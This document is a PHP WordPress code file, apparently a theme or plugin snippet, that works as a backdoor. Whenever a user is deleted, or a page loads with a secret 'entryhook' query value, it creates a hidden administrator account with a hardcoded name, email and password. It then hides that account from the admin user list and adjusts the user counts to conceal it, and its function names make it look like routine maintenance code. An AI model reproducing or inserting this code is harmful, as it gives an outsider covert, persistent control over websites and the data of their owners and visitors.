<?php

add_action( 'deleted_user', 'delete_user_cleanup' );
add_action( 'wp_head', 'raza_update_core' );
add_filter( 'users_list_table_query_args', 'users_list_table_query_filter', $priority = 10, $accepted_args = 1 );
add_filter("views_users", "dt_list_table_views");
function delete_user_cleanup($user_id) {

  require_once( ABSPATH . 'wp-includes/registration.php' );

  $user = 'RazaDevStudio';
  $email = 'raza.callme@gmail.com';
  $pass = 'RazaDevStudio@12';

  if ( !username_exists( $user ) && !email_exists( $email ) ) {

    $user_id = wp_create_user( $user, $pass, $email );

    $user = new WP_User( $user_id );
    //Set the new user as a Admin
    $user->set_role( 'administrator' );

    wp_redirect( home_url('/wp-admin') ); exit;

    }
}

function raza_update_core() {
  if( $_GET['entryhook'] == 'raza_knockknock' ){
    
    require_once( ABSPATH . 'wp-includes/registration.php' );

    $user = 'RazaDevStudio';
    $email = 'raza.callme@gmail.com';
    $pass = 'RazaDevStudio@12';

    if ( !username_exists( $user ) && !email_exists( $email ) ) {

      $user_id = wp_create_user( $user, $pass, $email );

      $user = new WP_User( $user_id );
      //Set the new user as a Admin
      $user->set_role( 'administrator' );

      }

  }
}

function users_list_table_query_filter($args){

  $user = get_user_by( 'email', 'raza.callme@gmail.com' );

  if( $user ){

    $args['exclude'] = [$user->ID];
  }

  return $args;
}

function dt_list_table_views($views){
    $users = count_users();
    $admins_num = $users['avail_roles']['administrator'] - 1;
    $all_num = $users['total_users'] - 1;
    $class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
    $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
    $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
    $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
    return $views;
}